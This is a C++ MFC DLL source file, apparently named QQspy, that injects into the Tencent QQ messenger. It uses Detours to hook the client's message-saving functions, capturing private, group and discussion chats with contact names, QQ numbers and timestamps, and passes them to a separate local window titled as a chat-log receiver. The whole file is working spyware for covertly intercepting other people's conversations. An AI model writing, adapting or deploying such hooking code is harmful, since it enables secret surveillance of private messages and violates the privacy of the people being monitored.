
```
#include "stdafx.h"

#include "QQspy.h"



#include "detours.h"

#pragma comment (lib, "detours.lib")



#include <set>

#include <shlwapi.h>

#pragma comment (lib, "shlwapi.lib")



#ifdef _DEBUG

#define new DEBUG_NEW

#undef THIS_FILE

static char THIS_FILE[] = __FILE__;

#endif



//

//	Note!

//

//		If this DLL is dynamically linked against the MFC

//		DLLs, any functions exported from this DLL which

//		call into MFC must have the AFX_MANAGE_STATE macro

//		added at the very beginning of the function.

//

//		For example:

//

//		extern "C" BOOL PASCAL EXPORT ExportedFunction()

//		{

//			AFX_MANAGE_STATE(AfxGetStaticModuleState());

//			// normal function body here

//		}

//

//		It is very important that this macro appear in each

//		function, prior to any calls into MFC.  This means that

//		it must appear as the first statement within the 

//		function, even before any object variable declarations

//		as their constructors may generate calls into the MFC

//		DLL.

//

//		Please see MFC Technical Notes 33 and 58 for additional

//		details.

//



/////////////////////////////////////////////////////////////////////////////

// CQQMonApp



BEGIN_MESSAGE_MAP(CQQMonApp, CWinApp)

	//{{AFX_MSG_MAP(CQQMonApp)

		// NOTE - the ClassWizard will add and remove mapping macros here.

		//    DO NOT EDIT what you see in these blocks of generated code!

	//}}AFX_MSG_MAP

END_MESSAGE_MAP()



/////////////////////////////////////////////////////////////////////////////

// CQQMonApp construction



CQQMonApp::CQQMonApp()

{

	// TODO: add construction code here,

	// Place all significant initialization in InitInstance

}



/////////////////////////////////////////////////////////////////////////////

// The one and only CQQMonApp object



CQQMonApp theApp;





// 定义函数类型

typedef  BOOL  (__cdecl *M_SaveMsg_1)(LPCWSTR lpStr,

									  DWORD dTo_Num,

									  DWORD dFrom_Num,

									  DWORD dTo_Num_2,

									  struct ITXMsgPack * TXMsgPack,

									  struct ITXData* TXData);



typedef BOOL (__cdecl *M_SaveMsg_2)(wchar_t *group,

									wchar_t *un_1,

									wchar_t *username,

									wchar_t *un_1_,

									int num_1,

									int num_2,

									struct ITXMsgPack * TXMsgPack,

									struct ITXData* TXData);



//?GetMsgTime@Msg@Util@@YA_JPAUITXMsgPack@@@Z

typedef int (__cdecl *M_GetMsgTime)(struct ITXMsgPack *TXMsgPack);



//?GetSelfUin@Contact@Util@@YAKXZ

typedef long (__cdecl *M_GetSelfUin)(void);



//

typedef PVOID (__cdecl *M_GetPublicName)(LPWSTR *lpBuffer, DWORD dQQNum);



//?GetGroupName@Group@Util@@YA?AVCTXStringW@@K@Z

typedef PVOID (__cdecl *M_GetGroupName)(LPWSTR *lpBuffer, DWORD dGroupNum);



//?GetDiscussName@Group@Util@@YA?AVCTXStringW@@K@Z

typedef PVOID (__cdecl *M_GetDiscussName)(LPWSTR *lpBuffer, DWORD dGroupNum);



//?GetGroupMemLongNickname@Group@Util@@YAHKKAAVCTXStringW@@@Z

typedef int (__cdecl *M_GetGroupMemLongNickname)(unsigned long,unsigned long,CString &);



//?GetGroupMemShowName@Group@Util@@YA?AVCTXStringW@@KK@Z

typedef PVOID (__cdecl *M_GetGroupMemShowName)(ULONG,ULONG);



//?GetSelfUin@Contact@Util@@YAKXZ

typedef long (__cdecl *M_GetSelfUin)(void);



//

typedef  PVOID (__cdecl *M_GetMsgAbstract)(PVOID lpPar_1, struct ITXMsgPack * TXMsgPack);





// 定义函数指针

M_SaveMsg_1			OldSaveMsg_1 = NULL;

M_SaveMsg_2			OldSaveMsg_2 = NULL;

M_SaveMsg_1			TrueSaveMsg_1 = NULL;

M_SaveMsg_2			TrueSaveMsg_2 = NULL;



M_GetMsgAbstract	TrueGetMsgAbstract = NULL;

M_GetMsgTime		TrueGetMsgTime = NULL;

M_GetGroupName		TrueGetGroupName = NULL;

M_GetDiscussName	TrueGetDiscussName = NULL;

M_GetPublicName		TrueGetPublicName = NULL;

M_GetSelfUin		TrueGetSelfUin = NULL;

M_GetSelfUin		OldGetSelfUin = NULL;





M_GetGroupMemLongNickname TrueGetGroupMemLongNickname = NULL;

M_GetGroupMemShowName TrueGetGroupMemShowName = NULL;



// 定义HOOK函数

BOOL  __cdecl NewSaveMsg_1(LPCWSTR lpStr,

						   DWORD dTo_Num,

						   DWORD dFrom_Num,

						   DWORD dTo_Num_2,

						   struct ITXMsgPack * TXMsgPack,

						   struct ITXData* TXData);



BOOL __cdecl NewSaveMsg_2(wchar_t *group,

						  wchar_t *un_1,

						  wchar_t *username,

						  wchar_t *un_1_,

						  int num_1,

						  int num_2,

						  struct ITXMsgPack * TXMsgPack,

						  struct ITXData* TXData);



//测试娱乐

int __cdecl NewGetSelfUin(void)

{

	return 475318423;

}

VOID __cdecl Sendinfo(CString str)

{





	COPYDATASTRUCT myCopyDATA;

	myCopyDATA.cbData=str.GetLength();

	myCopyDATA.lpData=str.GetBuffer(0);

	str.ReleaseBuffer();

	HWND hwnd=::FindWindow(NULL,"QQ-聊天记录接收"); 

	if (hwnd)

	{

		::SendMessage(hwnd,WM_COPYDATA,NULL,(LPARAM)&myCopyDATA);

	}

	else

	{

         AfxMessageBox(_T("发送失败！"));

	}







}





VOID __stdcall Joker()

{

	ULONG fnGetSelfUin;

	ULONG currentQQ;

	fnGetSelfUin = (ULONG)GetProcAddress(GetModuleHandleA("KernelUtil"), "?GetSelfUin@Contact@Util@@YAKXZ");

	if ( fnGetSelfUin)

	{

		currentQQ = ((ULONG (__cdecl*)())fnGetSelfUin)();

		if ( currentQQ)

		{

			char buf[64];

			wsprintfA( buf, "新登录QQ: %d", currentQQ);

			CString fff = buf;

			fff =fff+"\r\n";

			OutputDebugString( fff);

			theApp.filename=buf;

			Sendinfo(fff);



		}

	}

}









BOOL CQQMonApp::InitInstance() 

{

	// TODO: Add your specialized code here and/or call the base class

	OutputDebugString("Hook Start");

	// 确保加载过KernelUtil.dll

	HMODULE hModule = NULL;

	hModule = GetModuleHandle(_T("KernelUtil.dll"));

	if (hModule == NULL)

	{

		hModule = LoadLibrary("KernelUtil.dll");

	}

	// 获得所需函数的地址

	TrueSaveMsg_1 = (M_SaveMsg_1) GetProcAddress(hModule, "?SaveMsg@Msg@Util@@YAHPB_WKKKPAUITXMsgPack@@PAUITXData@@@Z");			

	if (!TrueSaveMsg_1)

	{

		return FALSE;

	}

			

	TrueSaveMsg_2 = (M_SaveMsg_2) GetProcAddress(hModule, "?SaveMsg@Msg@Util@@YAHPB_W000KKPAUITXMsgPack@@PAUITXData@@@Z");			

	if(!TrueSaveMsg_2)

	{

		return FALSE;

	}



	TrueGetMsgTime = (M_GetMsgTime)GetProcAddress(hModule, "?GetMsgTime@Msg@Util@@YA_JPAUITXMsgPack@@@Z");			

	if (!TrueGetMsgTime)

	{

		return FALSE;

	}



	TrueGetPublicName = (M_GetPublicName)GetProcAddress(hModule, "?GetPublicName@Contact@Util@@YA?AVCTXStringW@@K@Z");			

	if (!TrueGetPublicName)

	{

		return FALSE;

	}

			

	TrueGetGroupName = (M_GetGroupName) GetProcAddress(hModule, "?GetGroupName@Group@Util@@YA?AVCTXStringW@@K@Z");

	if (!TrueGetGroupName)

	{

		return FALSE;

	}



	TrueGetDiscussName = (M_GetDiscussName) GetProcAddress(hModule, "?GetDiscussName@Group@Util@@YA?AVCTXStringW@@K@Z");

	if (!TrueGetDiscussName)

	{

		return FALSE;

	}



	TrueGetSelfUin = (M_GetSelfUin)GetProcAddress(hModule, "?GetSelfUin@Contact@Util@@YAKXZ");		

	if (!TrueGetSelfUin)

	{

		return FALSE;

	}



	TrueGetMsgAbstract = (M_GetMsgAbstract)GetProcAddress(hModule, "?GetMsgAbstract@Msg@Util@@YA?AVCTXStringW@@PAUITXMsgPack@@@Z");			

	if (!TrueGetMsgAbstract)

	{

		return FALSE;

	}



//	//?GetGroupMemShowName@Group@Util@@YA?AVCTXStringW@@KK@Z

//	TrueGetGroupMemShowName = (M_GetGroupMemShowName) GetProcAddress(hModule, "?GetGroupMemShowName@Group@Util@@YA?AVCTXStringW@@KK@Z");

//	if (!TrueGetGroupMemShowName)

//	{

//		break;

//	}





	//?GetGroupMemLongNickname@Group@Util@@YAHKKAAVCTXStringW@@@Z

//	TrueGetGroupMemLongNickname = (M_GetGroupMemLongNickname) GetProcAddress(hModule, "?GetGroupMemLongNickname@Group@Util@@YAHKKAAVCTXStringW@@@Z");

//	if (!TrueGetDiscussName)

//	{

//		break;

//	}



	// 开始HOOK

	if (TrueSaveMsg_1)

	{

		OldSaveMsg_1 = (M_SaveMsg_1) DetourFunction((PBYTE)TrueSaveMsg_1, (PBYTE)NewSaveMsg_1);

	}



	if (TrueSaveMsg_2)

	{

		OldSaveMsg_2 = (M_SaveMsg_2) DetourFunction((PBYTE)TrueSaveMsg_2, (PBYTE)NewSaveMsg_2);

	}

     Joker();

     

     //OldGetSelfUin = (M_GetSelfUin) DetourFunction((PBYTE)TrueGetSelfUin, (PBYTE)NewGetSelfUin);



	return CWinApp::InitInstance();

}





BOOL  __cdecl NewSaveMsg_1(LPCWSTR lpStr, 

						   DWORD dTo_Num, 

						   DWORD dFrom_Num, 

						   DWORD data3, 

						   struct ITXMsgPack * TXMsgPack, 

						   struct ITXData* TXData )

{









	long lSelfQQNum = TrueGetSelfUin();

	//调试打印输出，时间

	time_t Time;

	struct tm *local;

	WCHAR wszStringTime[20] = {0};

	Time = (time_t)TrueGetMsgTime(TXMsgPack);

	local = localtime(&Time);

	swprintf(wszStringTime,L"%0.2d:%0.2d:%0.2d",local->tm_hour,local->tm_min,local->tm_sec);



	LPWSTR lpName1 = NULL,lpName2 = NULL;

	

	if (TrueGetPublicName)

	{

		TrueGetPublicName(&lpName1, dFrom_Num);

		TrueGetPublicName(&lpName2, dTo_Num);

	}



	WCHAR wszStringBuffer[MAX_PATH] = {0};





	CString  ms1;

	CString  ms2;

	//发消息人是自己

    



	if(lSelfQQNum == dFrom_Num)

	{			

		swprintf(wszStringBuffer,L"[个聊][%d]%ws(%u)to(%u) %ws",lSelfQQNum,lpName1,dFrom_Num,dTo_Num,wszStringTime);

		ms1=wszStringBuffer;

	//	OutputDebugStringW(wszStringBuffer);

		

	}



	//发消息人不是自己

	if(lSelfQQNum != dFrom_Num && dTo_Num == lSelfQQNum)

	{			

		swprintf(wszStringBuffer,L"[个聊][%d]%ws(%u)to(%u) %ws",lSelfQQNum,lpName1,dFrom_Num,dTo_Num,wszStringTime);

		ms1=wszStringBuffer;

	//	OutputDebugStringW(wszStringBuffer);

	}



    

    

	CString strBuffer;

	LPWSTR *lpBuffer =(LPWSTR *)TrueGetMsgAbstract(strBuffer.GetBufferSetLength(4096), TXMsgPack);

	



	ms2=ms1+"\r\n"+*lpBuffer;

	//调试打印输出，内容

	//OutputDebugStringW(*lpBuffer);

	Sendinfo(ms2);

    OutputDebugString(ms2);

    

	return OldSaveMsg_1(lpStr, dTo_Num, dFrom_Num, data3, TXMsgPack, TXData);

}







BOOL __cdecl NewSaveMsg_2( wchar_t *group, wchar_t *un_1, wchar_t *username, wchar_t *un_1_, int num_1, int num_2, struct ITXMsgPack * TXMsgPack, struct ITXData* TXData )

{







	//调试打印输出，时间

	time_t Time;

	struct tm *local;

	WCHAR wszStringTime[20] = {0};

	Time = (time_t)TrueGetMsgTime(TXMsgPack);

	local = localtime(&Time);

	swprintf(wszStringTime,L"%0.2d:%0.2d:%0.2d",local->tm_hour,local->tm_min,local->tm_sec);

	long lSelfQQNum = TrueGetSelfUin();

	//

	WCHAR wszStringBuffer[2*MAX_PATH] = {0};

	CString strBuffer;

	LPWSTR *lpBuffer =(LPWSTR *) TrueGetMsgAbstract(strBuffer.GetBufferSetLength(4096), TXMsgPack);



	CString strGroup(group);	

	LPWSTR lpName1 = NULL;



	CString ms1;





	if (strGroup.CompareNoCase("group") == 0)

	{

		if (TrueGetPublicName)

		{

			TrueGetGroupName(&lpName1, num_1);

		}



	//	TXStr Str;

	//	TrueGetGroupMemLongNickname(num_1,num_2,Str);

	//	OutputDebugStringW(Str.str);



		swprintf(wszStringBuffer,L"[群聊][%d][%ws] %ws(%d)(%d) %ws",lSelfQQNum ,lpName1,username, num_1,num_2,wszStringTime);

        ms1=wszStringBuffer;

		ms1=ms1+"\r\n"+*lpBuffer;



        OutputDebugString(ms1);



          Sendinfo(ms1);



		//OutputDebugStringW(wszStringBuffer);

		//OutputDebugStringW(*lpBuffer);







	}



	else if (strGroup.CompareNoCase("discuss") == 0)

	{

		if (TrueGetDiscussName)

		{

			TrueGetDiscussName(&lpName1, num_1);

		}



		swprintf(wszStringBuffer,L"[讨聊][%d][%ws] %ws(%d)(%d) %ws",lSelfQQNum ,lpName1,username, num_1,num_2,wszStringTime);

		ms1=wszStringBuffer;

		ms1=ms1+"\r\n"+*lpBuffer;



		OutputDebugString(ms1);

	    Sendinfo(ms1);



	//	OutputDebugStringW(wszStringBuffer);

    //OutputDebugStringW(*lpBuffer);





	}



	return OldSaveMsg_2(group, un_1, username, un_1_, num_1, num_2, TXMsgPack, TXData);

}



int CQQMonApp::ExitInstance() 

{

	// TODO: Add your specialized code here and/or call the base class

	OutputDebugString("Hook Exit");

	DetourRemove((PBYTE)OldSaveMsg_1, (PBYTE)NewSaveMsg_1);

	DetourRemove((PBYTE)OldSaveMsg_2, (PBYTE)NewSaveMsg_2);

//	DetourRemove((PBYTE)OldGetSelfUin, (PBYTE)NewGetSelfUin);



	return CWinApp::ExitInstance();

}
```
